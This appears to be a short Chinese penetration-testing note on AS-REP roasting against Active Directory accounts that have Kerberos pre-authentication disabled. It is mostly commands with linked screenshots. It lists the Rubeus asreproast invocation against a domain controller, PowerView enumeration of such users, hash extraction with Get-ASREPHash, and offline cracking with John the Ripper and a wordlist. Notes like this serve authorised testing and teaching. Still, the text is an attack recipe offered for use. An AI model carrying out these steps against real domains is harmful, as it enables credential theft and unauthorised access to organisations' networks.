	当用户关闭了kerberos预身份认证时可以进行攻击
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/378.png)

	>Rubeus.exe asreproast /user:y /dc:10.1.1.100 /domain:zone.com
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/379.png)

	或使用Powerview结合https://github.com/gold1029/ASREPRoast
	获取不要求kerberos预身份验证的域内用户
	>Get-DomainUser -PreauthNotRequired -Properties distinguishedname –Verbose
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/380.png)

	>Get-ASREPHash -UserName y -Domain zone.com -Verbose
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/381.png)

	破解RC4-HMAC AS-REP
	>john hash.txt --wordlist=wordlist.txt
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/382.png)
